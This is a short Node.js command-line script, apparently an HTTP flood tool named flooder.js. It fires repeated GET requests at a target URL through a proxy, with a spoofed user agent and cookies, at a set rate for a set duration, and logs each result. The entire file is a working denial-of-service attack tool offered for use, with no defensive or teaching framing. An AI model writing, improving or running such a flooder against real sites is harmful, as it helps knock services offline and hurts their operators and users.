const axios = require("axios");
const { HttpsProxyAgent } = require("https-proxy-agent");

// CLI arguments
const [
  ,, // node
  ,, // flooder.js
  targetURL,
  duration,
  rates,
  threads,
  proxy,
  userAgent,
  cookies,
  protocol
] = process.argv;

// Validate arguments
if (!targetURL || !duration || !rates || !threads || !proxy || !userAgent || !cookies || !protocol) {
  console.error("Usage: node flooder.js <targetURL> <duration> <rates> <threads> <proxy> <userAgent> <cookies> <protocol>");
  process.exit(1);
}

// Colors for logging
const colors = {
  COLOR_RED: "\x1b[31m",
  COLOR_GREEN: "\x1b[32m",
  COLOR_YELLOW: "\x1b[33m",
  COLOR_RESET: "\x1b[0m"
};
const colored = (colorCode, text) => console.log(`${colorCode}${text}${colors.COLOR_RESET}`);

// Convert rates to interval (ms)
const interval = 1000 / parseInt(rates); // e.g., 100 req/s -> 10ms per request
const durationMs = parseInt(duration) * 1000; // Convert duration to milliseconds

// Setup proxy agent
const proxyAgent = new HttpsProxyAgent(`http://${proxy}`);

// Setup axios instance
const axiosInstance = axios.create({
  httpsAgent: proxyAgent,
  httpAgent: proxyAgent,
  timeout: 5000, // 5s timeout per request
  headers: {
    "User-Agent": userAgent,
    "Cookie": cookies,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "DNT": "1"
  }
});

// Flood function
async function sendRequest() {
  try {
    const response = await axiosInstance.get(targetURL);
    colored(colors.COLOR_GREEN, `FLOODER | Success | Status: ${response.status} | Proxy: ${proxy}`);
  } catch (error) {
    if (error.response) {
      colored(colors.COLOR_RED, `FLOODER | Failed | Status: ${error.response.status} | Proxy: ${proxy}`);
    } else {
      colored(colors.COLOR_RED, `FLOODER | Error: ${error.message} | Proxy: ${proxy}`);
    }
  }
}

// Main flood loop
async function startFlooding() {
  colored(colors.COLOR_YELLOW, `FLOODER | Starting flood on ${targetURL} | Duration: ${duration}s | Rate: ${rates}/s | Proxy: ${proxy}`);

  const endTime = Date.now() + durationMs;
  let requestCount = 0;

  while (Date.now() < endTime) {
    await sendRequest();
    requestCount++;
    await new Promise(resolve => setTimeout(resolve, interval));
  }

  colored(colors.COLOR_GREEN, `FLOODER | Completed | Total Requests: ${requestCount} | Proxy: ${proxy}`);
}

// Run
startFlooding().catch(err => {
  colored(colors.COLOR_RED, `FLOODER | Fatal Error: ${err.message}`);
  process.exit(1);
});